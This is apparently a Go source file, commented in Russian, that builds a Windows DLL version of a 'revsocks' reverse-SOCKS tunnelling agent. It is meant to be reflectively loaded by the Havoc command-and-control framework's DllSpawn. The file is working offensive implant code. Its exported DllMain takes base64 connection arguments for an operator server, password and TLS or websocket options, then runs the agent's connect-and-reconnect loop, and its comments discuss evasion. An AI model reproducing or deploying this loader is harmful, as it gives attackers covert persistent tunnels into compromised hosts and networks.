//go:build cgo && windows

// havoc_dll.go — Havoc DllSpawn adaptation для revsocks v3 agent (c-shared DLL).
//
// Паттерн ligolo-ng (JohnDow22 fork): //export DllMain заменяет Go'вский дефолтный DllMain.
// Стандартный c-shared entry (DllMainCRTStartup) зовёт DllMain(hinst, ATTACH, lpvReserved).
// KaynLdr (Havoc DllSpawn) вызывает AddressOfEntryPoint = DllMainCRTStartup с lpParameter=args
// → DllMainCRTStartup форвардит lpvReserved=args в DllMain. entry point НЕ меняем (-Wl,-e
// ломал reflective-load — Go runtime падал под ручным маппированием KaynLdr).
//
// НИКАКИХ ВШИТЫХ target. args (base64 "-connect host:port -pass X -tls -ws") из lpvReserved.
// Нет -connect → не коннектимся (baked fallback выключен для DLL build — isStealth=false).

package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"encoding/base64"
	"os"
	"strings"
	"sync/atomic"
	"unsafe"
)

var started int32

// main — c-shared требует presence main, но он не вызывается (DllMain делает работу).
func main() {}

// DllMain — entry, зовётся DllMainCRTStartup. lpvReserved = args из Havoc DllSpawn.
//
//export DllMain
func DllMain(hinstDLL uintptr, fdwReason uint32, lpvReserved uintptr) bool {
	if fdwReason != 1 { // только DLL_PROCESS_ATTACH
		return true
	}
	if !atomic.CompareAndSwapInt32(&started, 0, 1) {
		return true
	}

	// args из lpvReserved (Havoc DllSpawn передаёт base64 строки args)
	args := ""
	if lpvReserved != 0 {
		raw := C.GoString((*C.char)(unsafe.Pointer(lpvReserved)))
		if dec, err := base64.StdEncoding.DecodeString(raw); err == nil {
			args = string(dec) // base64
		} else {
			args = raw // не base64 — как есть
		}
	}

	if !strings.Contains(args, "-connect") {
		// нет -connect — не коннектимся (no baked fallback для DLL build)
		return true
	}

	os.Args = append([]string{"revsocks"}, strings.Fields(args)...)
	mainImpl() // синхронно — держит процесс пока агент жив (connect/reconnect loop)
	return true
}
